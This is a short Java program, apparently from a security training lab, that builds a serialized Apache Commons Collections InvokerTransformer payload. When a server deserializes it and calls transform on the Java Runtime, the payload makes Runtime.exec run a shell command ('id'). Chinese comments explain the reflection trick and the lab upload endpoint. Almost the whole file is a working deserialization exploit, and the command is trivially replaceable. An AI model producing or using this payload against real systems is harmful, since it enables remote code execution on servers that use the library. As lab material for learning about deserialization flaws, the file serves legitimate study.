package class07;

import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * 生成 class07 的 payload — InvokerTransformer
 * 目标: 上传 InvokerTransformer 对象，靶场调用 t.transform(Runtime.getRuntime())
 * 靶场: /class07/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        // InvokerTransformer: 反射调用任意方法
        // 当服务端调用 t.transform(Runtime.getRuntime()) 时，
        // InvokerTransformer 会反射执行 Runtime.exec("id")
        InvokerTransformer trans = new InvokerTransformer(
            "exec",                              // 方法名
            new Class[]{String.class},           // 参数类型
            new Object[]{"id"}                   // 参数值
        );

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class07.ser"));
        oos.writeObject(trans);
        oos.close();

        System.out.println("✅ 已生成: class07.ser");
        System.out.println("靶场收到后: t.transform(Runtime.getRuntime()) → 执行命令");
    }
}
